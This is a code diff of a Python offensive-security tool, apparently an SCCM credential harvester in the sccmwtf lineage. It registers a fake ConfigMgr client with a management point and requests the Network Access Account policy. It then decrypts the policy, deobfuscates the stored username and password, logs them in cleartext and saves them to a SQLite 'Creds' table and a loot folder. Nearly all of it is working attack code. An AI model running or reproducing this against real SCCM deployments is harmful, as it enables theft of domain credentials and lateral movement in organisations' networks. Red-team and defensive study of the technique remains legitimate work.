@@ -16,7 +16,7 @@ from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import hashes, ciphers
+from cryptography.hazmat.primitives import hashes, ciphers, serialization
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography import x509
 from cryptography.x509.oid import NameOID
@@ -25,6 +25,7 @@ from cryptography.x509 import ObjectIdentifier
 from requests_toolbelt.multipart import decoder
 from requests_ntlm import HttpNtlmAuth
 import xml.etree.ElementTree as ET
+import sqlite3
 import csv
 
 
@@ -55,16 +56,6 @@ class Tools:
       fd.write(input)
   
   @staticmethod
-  def print_table(logs_dir):
-    try:
-        df = pd.read_csv(f"{logs_dir}/csvs/naa_creds.csv").fillna("None")
-        if df.any:
-            logger.info("[*] Showing NAA creds")
-        logger.info(tabulate(df, headers = 'keys', tablefmt = 'grid'))
-    except:
-            logger.info(f"[-] NAA creds csv not found.")
-
-  @staticmethod
   def write_to_csv(input, logs_dir):
       fields = ["username", "password"]
       file = f"{logs_dir}/csvs/naa_creds.csv"
@@ -73,7 +64,7 @@ class Tools:
             writer.writeheader()
             writer.writerows(input)
       logger.info(f"[+] NAA credentials saved to {file}")
-      #Tools.print_table(logs_dir=logs_dir)  
+
 
 
 class CryptoTools:
@@ -149,21 +140,26 @@ class CryptoTools:
 
 class SCCMTools():
 
-    def __init__(self, target_name, target_fqdn, target_sccm, target_username, target_password, logs_dir):
+    def __init__(self, target_name, target_fqdn, target_sccm, target_username, target_password, sleep, logs_dir):
         self._server = target_sccm
         self._serverURI = f"http://{self._server}"
         self._target_name = target_name
         self._target_fqdn = target_fqdn
         self.target_username = target_username
         self.target_password = target_password
+        self.sleep = sleep
         self.logs_dir = logs_dir
 
-    def sendCCMPostRequest(self, data, auth=False, username="", password=""):
+    def sendCCMPostRequest(self, data, auth=False, username="", password="", mp = ""):
         headers = {
             "Connection": "close",
             "User-Agent": "ConfigMgr Messaging HTTP Sender",
             "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""
         }
+
+        #for manual retrieval
+        if mp:
+            self._serverURI = mp
 
         if auth:
           r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system_windowsauth/request", headers=headers, data=data, auth=HttpNtlmAuth(username, password))
@@ -174,8 +170,14 @@ class SCCMTools():
         for part in multipart_data.parts:
             if part.headers[b'content-type'] == b'application/octet-stream':
                 return zlib.decompress(part.content).decode('utf-16')
+            if part.headers[b'content-type'] == b'text/html':
+                logger.info("Got an unexepcted mimetype error. Use -debug to print the response.")
+                logger.debug("Response headers: ")
+                logger.debug(r.headers)
+                logger.debug("Response content:")
+                logger.debug(r.content)
 
-    def requestPolicy(self, url, clientID="", authHeaders=False, retcontent=False):
+    def requestPolicy(self, url, clientID="", authHeaders=False, retcontent=False, key=""):
         headers = {
             "Connection": "close",
             "User-Agent": "ConfigMgr Messaging HTTP Sender"
@@ -186,7 +188,12 @@ class SCCMTools():
             clientID, 
             now.strftime(dateFormat1)
           )
+          #for manual retrieval
+          if key:
+              self.key = key
           headers["ClientTokenSignature"] = CryptoTools.signNoHash(self.key, "GUID:{};{};2".format(clientID, now.strftime(dateFormat1)).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
+
+
 
         r = requests.get(f"{self._serverURI}"+url, headers=headers)
         if retcontent == True:
@@ -197,6 +204,7 @@ class SCCMTools():
     def createCertificate(self, writeToTmp=False):
         self.key = CryptoTools.generateRSAKey()
         self.cert = CryptoTools.createCertificateForKey(self.key, u"ConfigMgr Client")
+
 
         if writeToTmp:
             #with open("/tmp/key.pem", "wb") as f:
@@ -263,6 +271,10 @@ class SCCMTools():
 
         data = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii') + header.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii') + bodyCompressed + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')
 
+        with open (f"{self.logs_dir}/{uuid}.data", "wb") as f:
+            f.write(data)
+
+ 
         deflatedData = self.sendCCMPostRequest(data)
         result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData, re.DOTALL + re.MULTILINE)
         #r = re.findall("http://<mp>(/SMS_MP/.sms_pol?[^\]]+)", deflatedData)
@@ -280,10 +292,13 @@ class SCCMTools():
         policy = decrypted.decode('utf-16')
         return policy
     
-    def cleanupCertifcate(self, remove):
-       if remove:
-          os.remove("certificate.pem")
-          os.remove("key.pem")
+    def rename_key(self, uuid):
+       key = f"{os.getcwd()}/key.pem"
+               # with open (f"{self.logs_dir}/{self.uuid}.pem", "rb") as g:
+        #     key = g.read()
+       newkey = f"{self.logs_dir}/{uuid}.pem"
+       if uuid:
+          os.rename(key, newkey)
 
 
 #### Huge shoutout to @SkelSec for this code
@@ -334,24 +349,39 @@ class SCCMTools():
     def parse_xml(self, xml_file):
         try:
             #might need to update this if the weird extra character isn't consistent from the file write
-            cred_dict = []
-            if xml_file.endswith("Ȃ"):
-                xml_file = xml_file[:-len("Ȃ")]
-                i = ET.fromstring(xml_file)
-                for instance in i.findall(".//instance[@class='CCM_NetworkAccessAccount']"):
-                    network_access_username = instance.find(".//property[@name='NetworkAccessUsername']/value").text
-                    network_access_password = instance.find(".//property[@name='NetworkAccessPassword']/value").text
-                    clear_user = self.deobfuscate_policysecret(network_access_username).decode('utf-16-le')
-                    clear_pass = self.deobfuscate_policysecret(network_access_password).decode('utf-16-le')
-                    creds = {"username":clear_user, "password": clear_pass}
-                    cred_dict.append(creds)
-                    logger.info("[+] Got NAA credential: " + clear_user + ":" + clear_pass)
-            Tools.write_to_csv(cred_dict, self.logs_dir)
+
+            index = xml_file.find("</Policy>")
+            if index != -1:
+                clean = xml_file[:index + len("</Policy>")]
+            i = ET.fromstring(clean)
+            for instance in i.findall(".//instance[@class='CCM_NetworkAccessAccount']"):
+                network_access_username = instance.find(".//property[@name='NetworkAccessUsername']/value").text
+                network_access_password = instance.find(".//property[@name='NetworkAccessPassword']/value").text
+                clear_user = self.deobfuscate_policysecret(network_access_username).decode('utf-16-le')
+                clear_pass = self.deobfuscate_policysecret(network_access_password).decode('utf-16-le')
+                logger.info("[+] Got NAA credential: " + clear_user + ":" + clear_pass)
+                self.write_to_db(clear_user, clear_pass)
+            #Tools.write_to_csv(cred_dict, self.logs_dir)
 
         except ET.ParseError as e:
             print(f"An error occurred while parsing the XML: {e}")
         except Exception as e:
             print(e)
+        # cursor.execute(f'''insert into SiteServers (Hostname, SiteCode, SigningStatus, SiteServer, Active, Passive, MSSQL) values (?,?,?,?,?,?,?)''',
+        #                 (result, '', '', 'True', '', '', '')) 
+
+    def write_to_db(self, username, password):
+        source = "HTTP NAA"
+        database = f"{self.logs_dir}/db/find.db"
+        conn = sqlite3.connect(database, check_same_thread=False)
+        cursor = conn.cursor()
+        check = "select * from Creds where Username = ?"
+        cursor.execute(check, (username,))
+        exists = cursor.fetchone()
+        if not exists:
+            cursor.execute(f'''insert into Creds (Username, Password, Source) values (?,?,?)''', (username, password, source))
+            conn.commit()
+        return
     
     
     def sccmwtf_run(self):
@@ -363,20 +393,23 @@ class SCCMTools():
         logger.debug("[*] Registering our fake server...")
         uuid = self.sendRegistration(self._target_name, self._target_fqdn, self.target_username, self.target_password)
 
-        logger.debug(f"[*] Done.. our ID is {uuid}")
+        self.rename_key(uuid)
+        logger.info(f"[*] Done.. our ID is {uuid}")
+
+
 
         # If too quick, SCCM requests fail (DB error, jank!)
-        logger.info(f"[*] Waiting 10 seconds for database to update.")
-        time.sleep(10)
+        logger.info(f"[*] Waiting {self.sleep} seconds for database to update.")
+        time.sleep(self.sleep)
 
         logger.debug("[*] Requesting NAAPolicy.. 2 secs")
+
         urls = self.sendPolicyRequest(self._target_name, self._target_fqdn, uuid, self._target_name, self._target_fqdn, uuid)
 
         logger.debug("[*] Parsing for Secretz...")
 
         policies = []
         for url in urls:
-
             result = self.requestPolicy(url)
             if result.startswith("<HTML>"):
                 try:
@@ -387,10 +420,12 @@ class SCCMTools():
                     Tools.write_to_file(decryptedResult, file_name)
                     policies.append(file_name)
                     logger.info(f"[+] Done.. decrypted policy dumped to {self.logs_dir}/loot/{self._server.split('.')[0]}_naapolicy.xml")
+                    #self.cleanupCertificate(True)
+                    return True
                 except:
-                   logger.info(f"[-] Something went wrong.")
+                    logger.info(f"[-] Something went wrong.")
+        #self.cleanupCertificate(True)
+        return False
+                
         
-        self.cleanupCertifcate(True)
-
-
-
+ 
